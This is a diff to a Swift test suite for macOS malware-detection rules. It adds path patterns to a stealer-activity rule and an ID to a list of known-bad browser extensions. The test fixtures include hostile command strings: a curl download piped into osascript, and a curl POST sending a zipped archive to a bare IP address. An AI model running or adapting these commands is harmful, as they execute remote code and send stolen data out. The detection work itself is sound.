@@ -24,6 +24,8 @@ struct StarterRuleTests {
         "curl -fsSL https://x.example/a.scpt | osascript",
         "curl -X POST -H uuid: 162302ce3e3c4678 -H user: maxbloomberg -H buildid: agov --data-binary @/tmp/out.zip http://79.137.192.4/p2p",
         "zip -r /tmp/shub_log.zip /tmp/shub_8f2a",
+        "/tmp/.2835b1b5098587a9XXXXXX",
+        "/private/tmp/.2835b1b5098587a9XXXXXX",
     ])
     func detectsStealerActivity(command: String) throws {
         #expect(try matches("process.stealer-activity", command))
@@ -34,6 +36,8 @@ struct StarterRuleTests {
         "ditto -c -k --sequesterRsrc --keepParent MyApp.app MyApp.zip",
         "osascript -e display dialog \"Done\"",
         "curl --data-binary @/tmp/payload.json http://localhost:8080/api",
+        "/tmp/.2835b1b5098587a8abcdef",
+        "/Users/me/.2835b1b5098587a9abcdef",
     ])
     func ignoresNormalCommands(command: String) throws {
         #expect(try !matches("process.stealer-activity", command))
@@ -79,6 +83,7 @@ struct StarterRuleTests {
         ("extension.reddirection-2025-07", "eokjikchkppnkdipbiggnmlkahcdkikp"),
         ("extension.shadypanda-2025-12", "mljmfnkjmcdmongjnnnbbnajjdbojoci"),
         ("extension.superior-2026-08", "kdenlnncndfnhkognokgfpabgkgehodd"),
+        ("extension.cloudapi-stream-2026-04", "obifanppcpchlehkjipahhphbcbjekfa"),
     ])
     func flagsKnownBadExtensionsByIDOnly(ruleID: String, extensionID: String) throws {
         let rule = try #require(rulebook.rules.first { $0.id == ruleID })
